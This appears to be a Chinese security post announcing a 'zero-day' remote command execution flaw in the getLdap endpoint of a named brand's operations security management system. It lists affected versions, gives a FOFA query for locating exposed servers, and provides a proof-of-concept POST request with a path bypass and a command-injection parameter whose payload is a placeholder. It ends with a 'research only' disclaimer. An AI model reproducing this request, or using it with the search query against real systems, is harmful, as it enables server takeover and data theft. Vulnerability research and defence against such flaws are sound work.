#  【0day】某知名品牌运维安全管理系统 getLdap 远程命令执行漏洞  
 0day收割机   2026-03-06 07:32  
  
# 漏洞简介  
  
某知名品牌运维安全管理系统 getLdap 接口存在远程命令执行漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。  
# 影响版本  
  
低于 3.0.12 20241106  
# fofa语法  
> body="/fort/login" && header="FORTSESSIONID"  
  
## POC  
```
POST /fort/user;help/getLdap HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

ldapIp=RCE_POC
```  
  
访问命令执行结果文件   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWBtIicpRfibo7UmkqhhS053B0VDRrYhZelhPVxFVyCJkGTjibPZIMw8gMfekxPypo7KdureH2Nx6LWYNO1o7yv9nVjeKzPkfQ9Llg/640?wx_fmt=png&from=appmsg "")  
  
成功得到命令执行  
结果  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
